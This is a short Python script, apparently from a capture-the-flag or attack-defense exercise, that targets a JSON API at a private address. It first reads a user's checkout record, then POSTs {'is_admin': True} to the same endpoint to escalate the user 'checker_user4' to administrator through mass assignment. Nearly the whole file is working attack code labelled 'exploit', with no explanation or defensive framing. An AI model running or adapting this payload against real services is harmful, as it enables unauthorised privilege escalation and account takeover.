import requests
import json

def checkout(login):
    url = f"http://192.168.8.22:5000/api/v1/numbers/checkout/{login}"
    headers = {
        "Accept": "application/json"
    }
    response = requests.get(url, headers=headers)
    print(response.text)


def exploit(login):
    url = f"http://192.168.8.22:5000/api/v1/numbers/checkout/{login}"
    headers = {
        "Content-Type": "application/json"
        }
    payload = {
        "is_admin": True
    }
    response = requests.post(url, headers=headers, data=json.dumps(payload))
    print(response.text)

if __name__ == "__main__":
    print("Checking parameters...")
    checkout("checker_user4")

    print("Exploiting...")
    exploit("checker_user4")